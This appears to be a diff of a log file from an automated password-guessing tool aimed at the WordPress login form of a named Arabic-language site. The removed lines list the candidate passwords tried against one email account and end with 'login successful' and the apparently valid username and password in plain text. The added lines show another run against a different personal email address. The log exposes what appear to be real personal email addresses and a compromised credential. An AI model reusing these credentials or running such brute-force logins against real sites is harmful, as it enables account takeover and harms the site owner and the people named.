@@ -1,7 +1,7 @@
-INFO:root:random password generated: Z4*+q#5,.a
+INFO:root:random password generated: 1,Z}D~fkLc
 INFO:root:username_element: log
 INFO:root:password_element: pwd
-INFO:root:random password generated: ;j8G}=>,tr
+INFO:root:random password generated: CAM.7qXq<2
 INFO:root:username_element: log
 INFO:root:password_element: pwd
 INFO:root:{
@@ -75,10 +75,11 @@ INFO:root:{
   "form": "<form action=\"https://alqlambara.com/wp-login.php\" id=\"loginform\" method=\"post\" name=\"loginform\">\n<p>\n<label for=\"user_login\">\u0627\u0633\u0645 \u0627\u0644\u0645\u0633\u062a\u062e\u062f\u0645 \u0623\u0648 \u0627\u0644\u0628\u0631\u064a\u062f \u0627\u0644\u0625\u0644\u0643\u062a\u0631\u0648\u0646\u064a</label>\n<input autocapitalize=\"none\" autocomplete=\"username\" class=\"input\" id=\"user_login\" name=\"log\" size=\"20\" type=\"text\" value=\"\"/>\n</p>\n<div class=\"user-pass-wrap\">\n<label for=\"user_pass\">\u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631</label>\n<div class=\"wp-pwd\">\n<input autocomplete=\"current-password\" class=\"input password-input\" id=\"user_pass\" name=\"pwd\" size=\"20\" type=\"password\" value=\"\"/>\n<button aria-label=\"\u0639\u0631\u0636 \u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631\" class=\"button button-secondary wp-hide-pw hide-if-no-js\" data-toggle=\"0\" type=\"button\">\n<span aria-hidden=\"true\" class=\"dashicons dashicons-visibility\"></span>\n</button>\n</div>\n</div>\n<p class=\"forgetmenot\"><input id=\"rememberme\" name=\"rememberme\" type=\"checkbox\" value=\"forever\"/> <label for=\"rememberme\">\u062a\u0630\u0643\u0631\u0646\u064a</label></p>\n<p class=\"submit\">\n<input class=\"button button-primary button-large\" id=\"wp-submit\" name=\"wp-submit\" type=\"submit\" value=\"\u062f\u062e\u0648\u0644\"/>\n<input name=\"redirect_to\" type=\"hidden\" value=\"https://alqlambara.com/wp-admin/\"/>\n<input name=\"testcookie\" type=\"hidden\" value=\"1\"/>\n</p>\n</form>",
   "user_param": "log",
   "password_param": "pwd",
-  "contentLen": 4759.0,
-  "_pw_impl_instance__getRequestData": "<function ImplToApiMapping.wrap_handler.<locals>.wrapper_func at 0x7f5e8cbab1c0>",
+  "contentLen": 4796.0,
+  "_pw_impl_instance__getRequestData": "<function ImplToApiMapping.wrap_handler.<locals>.wrapper_func at 0x7f6dc768b1c0>",
   "post_data": {
-    "pwd": ";j8G}=>,tr",
+    "log": "mohamadassi173@gmail.com",
+    "pwd": "CAM.7qXq<2",
     "wp-submit": "\u062f\u062e\u0648\u0644",
     "redirect_to": "https://alqlambara.com/wp-admin/",
     "testcookie": "1"
@@ -88,17 +89,8 @@ INFO:root:{
   "status_code": 200,
   "req_body_type": "URL_ENCODED"
 }
-INFO:root:[main]: requests: True
-INFO:root:[+ payload]: {'pwd': 'bara123405', 'wp-submit': 'دخول', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1', 'log': 'alqlambara@gmail.com'}
+INFO:root:[main]: headless: True
 INFO:root:[check_login] Status code!: 200
-INFO:root: max_similarity: 1.0
-INFO:root:[+ payload]: {'pwd': 'astmamsh123', 'wp-submit': 'دخول', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1', 'log': 'alqlambara@gmail.com'}
+INFO:root: max_similarity: 0.9533333333333334
 INFO:root:[check_login] Status code!: 200
-INFO:root: max_similarity: 1.0
-INFO:root:[+ payload]: {'pwd': 'bara12340', 'wp-submit': 'دخول', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1', 'log': 'alqlambara@gmail.com'}
-INFO:root:[check_login] Status code!: 302
-INFO:root:[check_login] Status code changed!: 302
-INFO:root:login successful
-
-username: alqlambara@gmail.com
-password: bara12340
+INFO:root: max_similarity: 0.9533333333333334
